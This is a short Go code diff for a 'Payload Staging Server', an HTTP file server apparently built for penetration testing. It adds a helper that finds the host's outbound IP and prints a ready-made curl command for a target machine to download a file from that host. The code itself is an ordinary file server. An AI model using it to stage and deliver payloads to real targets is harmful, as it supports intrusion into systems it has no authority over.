@@ -4,9 +4,25 @@ import (
 	"flag"
 	"fmt"
 	"log"
+	"net"
 	"net/http"
 	"os"
 )
+
+// Gets the outbound address I am after
+func getOutboundIP() net.IP {
+	// We use Google's public DNS as a destination, but any IP works.
+	// No connection is actually established.
+	conn, err := net.Dial("udp", "8.8.8.8:80")
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer conn.Close()
+
+	localAddr := conn.LocalAddr().(*net.UDPAddr)
+
+	return localAddr.IP
+}
 
 // Function for staging the payload directory
 func stagePayloadDirectory(port string, stagingDir string)  {
@@ -20,7 +36,7 @@ func stagePayloadDirectory(port string, stagingDir string)  {
 			log.Fatal("Error creating directory:", err)
 		}
 
-		// Add a possible section for adding files from a file here
+		// Add a possible section for adding files from a folder here
 	}
 
 	// Creates the file server handler
@@ -29,7 +45,7 @@ func stagePayloadDirectory(port string, stagingDir string)  {
 	// Outputs information
 	fmt.Printf("[*] Go Payload Staging Server running on port %s\n", port)
 	fmt.Printf("[*] Serving files from: %s\n", stagingDir)
-	fmt.Printf("[*] Target download: curl http://<your-ip>:%s/payload.sh\n", port)
+	fmt.Printf("[*] Target download example: curl http://%s:%s/%s/file\n", getOutboundIP(), port, stagingDir)
 
 	// Starts the server
 	err := http.ListenAndServe(":"+port, fileServer)
